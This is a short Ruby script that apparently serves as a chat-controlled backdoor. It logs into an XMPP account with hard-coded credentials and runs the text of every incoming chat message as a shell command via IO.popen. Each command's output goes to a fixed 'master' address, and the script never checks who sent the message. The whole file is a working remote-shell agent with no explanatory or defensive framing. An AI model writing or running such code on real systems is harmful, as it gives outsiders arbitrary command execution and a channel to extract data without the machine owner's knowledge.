require 'rubygems'
require 'xmpp4r-simple'

include Jabber

jid = 'bot@gmail.com'
pass = 'passw0rd'

jabber = Simple.new(jid, pass)
Jabber::debug = true

loop do
  messages = jabber.received_messages
  messages.each do |message|
    body = message.body if message.type == :chat
    
    process = IO.popen(body)
    result = process.readlines
    
    jabber.deliver('master@gmail.com', result)
  end
  
  sleep 1
end